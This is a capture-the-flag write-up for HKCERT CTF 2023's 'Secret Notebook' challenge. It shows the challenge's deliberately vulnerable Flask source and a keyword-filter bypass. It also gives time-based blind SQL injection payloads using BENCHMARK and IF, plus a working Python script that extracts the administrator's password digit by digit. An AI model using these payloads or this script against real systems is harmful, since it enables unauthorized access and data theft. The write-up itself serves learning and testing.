# Secret Notebook

## Table of Contents

 1. [Overview](#overview)  
 2. [Background](#background)  
 3. [Enumeration](#enumeration)  
    3.1. [Found Raw SQL Query](#found-raw-sql-query)  
    3.2. [Time-based SQL Injection](#time-based-sql-injection)  
 4. [Exploitation](#exploitation)  
    4.1. [Exploiting Conditional Time-based SQL Injection](#exploiting-conditional-time-based-sql-injection)  
 5. [Conclusion](#conclusion)

## Overview

- 24 solves / 350 points
- Author: viky
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113203213.png)

I wrote a notebook with some juicy secret! Didn't know what's inside then.

Web: [http://chal-a.hkcert23.pwnable.hk:28107](http://chal-a.hkcert23.pwnable.hk:28107) , [http://chal-b.hkcert23.pwnable.hk:28107](http://chal-b.hkcert23.pwnable.hk:28107)

Attachment: [secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip](https://file.hkcert23.pwnable.hk/secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113203601.png)

When we're not authenticated, we're redirected to route `/index`.

In here, we can login and signup to an account.

Let's try to register a new one!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113203922.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113203951.png)

When we clicked the "Signup" button, it'll send a POST request to route `/signup` with JSON body data.

**After signing up, we can click the "Login" button to login:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204101.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204123.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204146.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204232.png)

When we clicked the "Login" button, it'll send a POST request to route `/login` with JSON body data.

Then, it'll redirect us to route `/home`with cookie `token=<base64_encoded_string>`.

**We can base64 decode if we want:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Secret-Notebook)-[2023.11.13|20:37:41(HKT)]
└> echo -n 'c2l1bmFtOnBhc3N3b3Jk' | base64 -d                            
siunam:password
```

Nothing weird, it just store our username and password in the cookie.

**After authenticating, we can submit a note, retrieve secret and public notes:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204553.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204600.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204615.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204623.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204702.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113204710.png)

Now, we have a high-level overview of the web application. Let's view the source code!

**In challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/web/Secret-Notebook/secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Secret-Notebook)-[2023.11.13|20:48:20(HKT)]
└> file secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip 
secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Secret-Notebook)-[2023.11.13|20:48:23(HKT)]
└> unzip secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip 
Archive:  secret-notebook_7b1907aba402ecdb7ac74b14972cf0a0.zip
   creating: db/
  inflating: db/init.sql             
  inflating: db/Dockerfile           
   creating: app/
  inflating: app/app.py              
 extracting: app/requirements.txt    
   creating: app/static/
  inflating: app/static/index.html   
  inflating: app/static/home.html    
  inflating: app/Dockerfile          
  inflating: docker-compose.yml      
```

After reading a little bit, we can see something stands out:

**First, the flag is in the `Administrator`'s secret note:**
```python
[...]
CONFIG = {
    'user': 'root',
    'password': 's2rYMCv3g2Gk',
    'host': 'db',
    'port': '3306',
    'database': 'notebook'
}

def getConnector():
    while(True):
        try:
            global CONFIG
            connection = mysql.connector.connect(**CONFIG)
            return connection
        except Exception as e:
            print(f'Failed with reason: {e}')
            print(f'Retrying in 5 second')
            time.sleep(5)


def init():
    connector = getConnector()
    cursor = connector.cursor()
    digits = string.digits
    password = ''.join(secrets.choice(digits) for i in range(16))
    cursor.execute(f"INSERT INTO users (username, password, publicnote, secretnote) VALUES ('{'Administrator'}','{password}','{'Welcome! I am admin and I hope you are having fun.'}', '{os.environ['FLAG']}') ON DUPLICATE KEY UPDATE password = '{password}';")
    connector.commit()
    cursor.close()
    connector.close()
[...]
```

So, **our objective in this challenge is to read `Administrator`'s secret note.**

But how??

### Found Raw SQL Query

**In route `/note`, there's a SQL injection vulnerability in retrieving public notes!**
```python
[...]
@app.route('/note',methods=['GET','POST'])
def note():
    token = request.cookies.get('token')
    username = auth(token)
    if(username == None):
        return 'Forbidden',403
    if request.method == 'GET':
        noteType = request.args.get('noteType')
        column = request.args.get("column")
        ascending = request.args.get("ascending")
        results = None
        if noteType == 'secret':
            results = doGetSecretNote(username)
        if noteType == 'public':
            results = doGetPublicNotes(column, ascending)
        return json.dumps({'content': results})
    if request.method == 'POST' and request.json:
        params = request.get_json()
        content = params['content']
        try:
            doUpdatePublicNotes(content,username)
            return 'OK',200
        except Exception as e:
            return f'Internal Error {e}',500

    return 'Bad Request',400
[...]
```

When a GET request is sent to `/note` with GET parameter `noteType=public`, it'll call function `doGetPublicNotes()`, with argument `column` (GET parameter `column`) and `ascending` (GET parameter `ascending`).

In function `doGetPublicNotes()`, it's using **raw SQL query** to retrieve the public note!

```python
[...]
def doGetPublicNotes(column, ascending):
    connector = getConnector()
    cursor = connector.cursor()
    if column and not isInputValid(column):
        abort(403)
    if ascending  != "ASC":
        ascending = "DESC"
    cursor.execute(f"SELECT username, publicnote FROM users ORDER BY {column} {ascending};")
    results = []
    for row in cursor.fetchall():
        results.append({'username':row[0],
        'publicnote':row[1]})
    cursor.close()
    connector.close()
    return results
[...]
```

However, **the only thing we can only control is `column`**. As when the `ascending`'s value is not `ASC`, it'll just use `DESC`.

**Moreover, the `column` variable is also validated by function `isInputValid()`:**
```python
def isInputValid(untrustedInput: str) -> bool:
    if "'" in untrustedInput \
        or "\"" in untrustedInput \
        or ";"  in untrustedInput \
        or "/"  in untrustedInput \
        or "*"  in untrustedInput \
        or "-"  in untrustedInput \
        or "#"  in untrustedInput \
        or "select"  in untrustedInput.lower() \
        or "insert"  in untrustedInput.lower() \
        or "update"  in untrustedInput.lower() \
        or "delete"  in untrustedInput.lower() \
        or "where"  in untrustedInput.lower() \
        or "union"  in untrustedInput.lower() \
        or "sleep"  in untrustedInput.lower() \
        or "secretnote"  in untrustedInput.lower() :
        return False
    return True
```

As you can see, tons of characters and keywords can't be used in the `column` variable.

To confirm the web application has a SQL injection vulnerability in the route `/note`, we can test it.

**First, we can try to determine how many columns will be retrieved from table `users`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113210101.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113210115.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113210127.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113210137.png)

Now we can confirm that the `column` variable can be injected with SQL injection payloads.

The HTTP status "500 Internal Server Error" indicates that the SQL query occurred an error.

When we try to `ORDER BY 0/3` and an error occurred, it's because the `SELECT` clause only retrieve 2 columns (`username` and `publicnote`).

However, we can't the common SQL injection payloads like `' OR 1=1-- -` because of the filter.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113210638.png)

### Time-based SQL Injection

After some digging, I found that we can leverage **time-based SQL injection**!

**Although the `SLEEP()` function keyword is filtered, function `BRENCHMARK()` is NOT!**

**According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-time-based), we can use the following payload to determine the injection is success or not:**
```sql
BENCHMARK(<count>,<expr>)
BENCHMARK(40000000,SHA1(1337))
```

> In MySQL, the `BENCHMARK()` function executes the expression _`expr`_ repeatedly _`count`_ times. It may be used to time how quickly MySQL processes the expression. The result value is `0`, or `NULL` for inappropriate arguments such as a `NULL` or negative repeat count. (from [https://dev.mysql.com/doc/refman/8.0/en/information-functions.html](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html))

In the above payload, **it'll calculate the SHA-1 hash of input `1337` for 40000000 times**.

However, this function can be abused for time-based SQL injection, just like the `SLEEP()` function.

**Let's try that!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113211812.png)

As you can see, when we send the payload, it executed injected SQL query for **3.7 seconds**. Normally it'll be around 20 milliseconds. 

## Exploitation

But wait. **How can we determine something is true or false?**

**In [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#using-conditional-statements), we can also see how we can use conditional statements to determine something is true or false:**
```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
```

But hold up... It's using keyword `SELECT`... Which will be filtered in our case...

Hmm... Maybe we can bypass the `SELECT` keyword?

**Upon researching, I found [this PDF for a conference back in 2010](https://websec.files.wordpress.com/2010/11/sqli2.pdf), and it talked about how to bypass the `SELECT` keyword:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113212436.png)

Holy moly... This bypass is hard to understand...

### Exploiting Conditional Time-based SQL Injection

**After fumbling around, I found that we can just use conditional statements without `SELECT` clause:**
```sql
IF(<condition>,<value_if_true>,<value_if_false>)
IF(1=1,BENCHMARK(50000,SHA1(1337)),0)
IF(1=2,BENCHMARK(50000,SHA1(1337)),0)
```

In here, we can use the `IF()` function to determine something is true or false.

If it's true, execute the computational expensive expression, else, just return 0.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113213023.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113213036.png)

But wait, should we even brute force `Administrator`'s secret note??

**After looking at the source code carefully, I found that `Administrator`'s password is just 16-digit long:**
```python
[...]
password = ''.join(secrets.choice(digits) for i in range(16))
[...]
```

That being said, it's easier to brute force the password!

**To do so, we can use function `SUBSTR()` to brute force the password digit by digit:**
```sql
IF(SUBSTR(password,<digit_position>,1)=<digit_here>,BENCHMARK(50000,SHA1(1337)),0)
IF(SUBSTR(password,1,1)=0,BENCHMARK(50000,SHA1(1337)),0)
IF(SUBSTR(password,1,1)=1,BENCHMARK(50000,SHA1(1337)),0)
IF(SUBSTR(password,1,1)=2,BENCHMARK(50000,SHA1(1337)),0)
...
```

Now, you might ask how can we ensure that we're brute forcing `Administrator`'s password but not others??

Since `Administrator` user is being inserted at the first place, **the first record should be `Administrator` user.**

Armed with above information, it's time to brute force `Administrator`'s password!

**To do so, I'll write a script in Python:**
```python
#!/usr/bin/env python3
import requests
import string
from time import time

CHARACTER_SET = string.digits

def bruteForce(URL, token):
    cookie = {'token': token}
    position = 1
    while True:
        for digit in CHARACTER_SET:
            if position >= 17:
                exit(0)

            # digit 0 always get executed, don't know why
            payload = f'IF(SUBSTR(password,{position},1)={digit},BENCHMARK(100000,SHA1(1337)),0)'

            startTime = time()
            reponse = requests.get(f'{URL}{payload}', cookies=cookie)
            endTime = time()
            totalTime = endTime - startTime

            output = f'[*] Payload: {payload} | took {totalTime:.5f} seconds | digit: {digit} | position: {position}'
            print(output)

            isLastDigit = True if digit == CHARACTER_SET[-1] else False
            if isLastDigit:
                position += 1
                print('-' * len(output))
                break

if __name__ == '__main__':
    URL = 'http://chal-a.hkcert23.pwnable.hk:28107/note?noteType=public&column='
    token = 'c2l1bmFtOnBhc3N3b3Jk'

    bruteForce(URL, token)
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Secret-Notebook)-[2023.11.13|22:15:00(HKT)]
└> python3 solve.py
[*] Payload: IF(SUBSTR(password,1,1)=0,BENCHMARK(100000,SHA1(1337)),0) | took 7.76973 seconds | digit: 0 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=1,BENCHMARK(100000,SHA1(1337)),0) | took 0.14063 seconds | digit: 1 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=2,BENCHMARK(100000,SHA1(1337)),0) | took 0.18244 seconds | digit: 2 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=3,BENCHMARK(100000,SHA1(1337)),0) | took 0.15231 seconds | digit: 3 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=4,BENCHMARK(100000,SHA1(1337)),0) | took 0.09472 seconds | digit: 4 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=5,BENCHMARK(100000,SHA1(1337)),0) | took 0.09493 seconds | digit: 5 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=6,BENCHMARK(100000,SHA1(1337)),0) | took 0.12526 seconds | digit: 6 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=7,BENCHMARK(100000,SHA1(1337)),0) | took 0.08116 seconds | digit: 7 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=8,BENCHMARK(100000,SHA1(1337)),0) | took 0.07868 seconds | digit: 8 | position: 1
[*] Payload: IF(SUBSTR(password,1,1)=9,BENCHMARK(100000,SHA1(1337)),0) | took 0.11277 seconds | digit: 9 | position: 1
----------------------------------------------------------------------------------------------------------------------
[*] Payload: IF(SUBSTR(password,2,1)=0,BENCHMARK(100000,SHA1(1337)),0) | took 1.24198 seconds | digit: 0 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=1,BENCHMARK(100000,SHA1(1337)),0) | took 0.13085 seconds | digit: 1 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=2,BENCHMARK(100000,SHA1(1337)),0) | took 0.13945 seconds | digit: 2 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=3,BENCHMARK(100000,SHA1(1337)),0) | took 0.08345 seconds | digit: 3 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=4,BENCHMARK(100000,SHA1(1337)),0) | took 0.11109 seconds | digit: 4 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=5,BENCHMARK(100000,SHA1(1337)),0) | took 5.67535 seconds | digit: 5 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=6,BENCHMARK(100000,SHA1(1337)),0) | took 0.11492 seconds | digit: 6 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=7,BENCHMARK(100000,SHA1(1337)),0) | took 0.15960 seconds | digit: 7 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=8,BENCHMARK(100000,SHA1(1337)),0) | took 0.06831 seconds | digit: 8 | position: 2
[*] Payload: IF(SUBSTR(password,2,1)=9,BENCHMARK(100000,SHA1(1337)),0) | took 0.11744 seconds | digit: 9 | position: 2
----------------------------------------------------------------------------------------------------------------------
[...]
[*] Payload: IF(SUBSTR(password,16,1)=0,BENCHMARK(100000,SHA1(1337)),0) | took 7.03059 seconds | digit: 0 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=1,BENCHMARK(100000,SHA1(1337)),0) | took 0.08455 seconds | digit: 1 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=2,BENCHMARK(100000,SHA1(1337)),0) | took 0.07786 seconds | digit: 2 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=3,BENCHMARK(100000,SHA1(1337)),0) | took 0.10718 seconds | digit: 3 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=4,BENCHMARK(100000,SHA1(1337)),0) | took 0.08418 seconds | digit: 4 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=5,BENCHMARK(100000,SHA1(1337)),0) | took 0.07271 seconds | digit: 5 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=6,BENCHMARK(100000,SHA1(1337)),0) | took 0.11083 seconds | digit: 6 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=7,BENCHMARK(100000,SHA1(1337)),0) | took 0.23968 seconds | digit: 7 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=8,BENCHMARK(100000,SHA1(1337)),0) | took 0.07382 seconds | digit: 8 | position: 16
[*] Payload: IF(SUBSTR(password,16,1)=9,BENCHMARK(100000,SHA1(1337)),0) | took 0.17193 seconds | digit: 9 | position: 16
------------------------------------------------------------------------------------------------------------------------
```

As you can see, some digits took a little longer to be executed.

> Note: Digit `0` always get executed. Also, the execution time gets progressively shorter, I have no clue why this is happening.

**Hence, we can determine which digits are correct.**

**In our case, the correct password is `0557192864287807`:**
```shell
[*] Payload: IF(SUBSTR(password,1,1)=0,BENCHMARK(100000,SHA1(1337)),0) | took 7.76973 seconds | digit: 0 | position: 1
[*] Payload: IF(SUBSTR(password,2,1)=5,BENCHMARK(100000,SHA1(1337)),0) | took 5.67535 seconds | digit: 5 | position: 2
[*] Payload: IF(SUBSTR(password,3,1)=5,BENCHMARK(100000,SHA1(1337)),0) | took 5.91817 seconds | digit: 5 | position: 3
[*] Payload: IF(SUBSTR(password,4,1)=7,BENCHMARK(100000,SHA1(1337)),0) | took 5.15217 seconds | digit: 7 | position: 4
[*] Payload: IF(SUBSTR(password,5,1)=1,BENCHMARK(100000,SHA1(1337)),0) | took 4.71980 seconds | digit: 1 | position: 5
[*] Payload: IF(SUBSTR(password,6,1)=9,BENCHMARK(100000,SHA1(1337)),0) | took 4.89355 seconds | digit: 9 | position: 6
[*] Payload: IF(SUBSTR(password,7,1)=2,BENCHMARK(100000,SHA1(1337)),0) | took 4.57795 seconds | digit: 2 | position: 7
[*] Payload: IF(SUBSTR(password,8,1)=8,BENCHMARK(100000,SHA1(1337)),0) | took 3.64779 seconds | digit: 8 | position: 8
[*] Payload: IF(SUBSTR(password,9,1)=6,BENCHMARK(100000,SHA1(1337)),0) | took 3.23760 seconds | digit: 6 | position: 9
[*] Payload: IF(SUBSTR(password,10,1)=4,BENCHMARK(100000,SHA1(1337)),0) | took 2.92061 seconds | digit: 4 | position: 10
[*] Payload: IF(SUBSTR(password,11,1)=2,BENCHMARK(100000,SHA1(1337)),0) | took 2.18108 seconds | digit: 2 | position: 11
[*] Payload: IF(SUBSTR(password,12,1)=8,BENCHMARK(100000,SHA1(1337)),0) | took 2.03635 seconds | digit: 8 | position: 12
[*] Payload: IF(SUBSTR(password,13,1)=7,BENCHMARK(100000,SHA1(1337)),0) | took 1.59135 seconds | digit: 7 | position: 13
[*] Payload: IF(SUBSTR(password,14,1)=8,BENCHMARK(100000,SHA1(1337)),0) | took 1.11044 seconds | digit: 8 | position: 14
[*] Payload: IF(SUBSTR(password,15,1)=0,BENCHMARK(100000,SHA1(1337)),0) | took 8.34426 seconds | digit: 0 | position: 15
[*] Payload: IF(SUBSTR(password,16,1)=7,BENCHMARK(100000,SHA1(1337)),0) | took 0.23968 seconds | digit: 7 | position: 16
```

**Finally, we can login to the `Administrator` account!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113223007.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113223014.png)

**And read its secret note!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113223036.png)

- **Flag: `hkcert23{17_15_n07_50_53cr37_4f73r_4ll}`**

## Conclusion

What we've learned:

1. Exploiting conditional time-based SQL injection & filter bypass